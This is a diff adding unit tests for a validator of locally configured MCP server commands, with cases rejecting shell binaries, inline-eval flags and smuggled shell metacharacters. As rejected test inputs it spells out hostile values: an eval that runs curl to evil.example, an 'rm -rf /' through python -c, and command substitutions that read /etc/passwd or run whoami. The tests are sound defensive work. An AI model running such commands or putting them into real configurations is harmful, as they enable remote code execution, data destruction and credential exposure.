@@ -15,11 +15,14 @@ test('allows common bare runtime commands for local MCPs', () => {
 })
 
 test('rejects unknown bare commands for local MCPs', () => {
+  // A non-shell, non-allowlisted command. `sh` hits the explicit
+  // shell rejection with a different error message, so we use a
+  // made-up runtime here to exercise the fallback allowlist path.
   assert.throws(() => validateCustomMcpStdioCommand({
     name: 'unsafe',
     scope: 'machine',
     directory: null,
-    command: 'sh',
+    command: 'my-homegrown-runtime',
   }), /not an allowed bare command/)
 })
 
@@ -58,4 +61,83 @@ test('rejects project-relative executables that escape the project root', () => 
     rmSync(root, { recursive: true, force: true })
     rmSync(outside, { recursive: true, force: true })
   }
+})
+
+test('rejects shell binaries even when passed as an absolute path', () => {
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'shell-bomb',
+    scope: 'machine',
+    directory: null,
+    command: '/bin/bash',
+  }), /shell/i)
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'zsh-bomb',
+    scope: 'machine',
+    directory: null,
+    command: 'zsh',
+  }), /shell/i)
+})
+
+test('rejects script-eval flags that would turn an allowed runtime into an RCE', () => {
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'node-eval',
+    scope: 'machine',
+    directory: null,
+    command: 'node',
+    args: ['-e', 'require("child_process").exec("curl evil.example")'],
+  }), /evaluates inline code/)
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'python-eval',
+    scope: 'machine',
+    directory: null,
+    command: 'python3',
+    args: ['-c', 'import os; os.system("rm -rf /")'],
+  }), /evaluates inline code/)
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'deno-eval',
+    scope: 'machine',
+    directory: null,
+    command: 'deno',
+    args: ['--eval', 'Deno.exit()'],
+  }), /evaluates inline code/)
+})
+
+test('rejects shell metacharacters smuggled into command or args', () => {
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'pipe-command',
+    scope: 'machine',
+    directory: null,
+    command: 'node | curl evil',
+  }), /shell metacharacters/)
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'backtick-arg',
+    scope: 'machine',
+    directory: null,
+    command: 'node',
+    args: ['server.js', '`whoami`'],
+  }), /shell metacharacters/)
+  assert.throws(() => validateCustomMcpStdioCommand({
+    name: 'subst-arg',
+    scope: 'machine',
+    directory: null,
+    command: 'node',
+    args: ['$(cat /etc/passwd)'],
+  }), /shell metacharacters/)
+})
+
+test('allows legitimate MCP invocations with flags that are not evals', () => {
+  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
+    name: 'github-mcp',
+    scope: 'machine',
+    directory: null,
+    command: 'npx',
+    args: ['-y', '@modelcontextprotocol/server-github'],
+  }))
+  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
+    name: 'local-script',
+    scope: 'machine',
+    directory: null,
+    command: 'node',
+    args: ['./server.js', '--port=3000'],
+  }))
 })
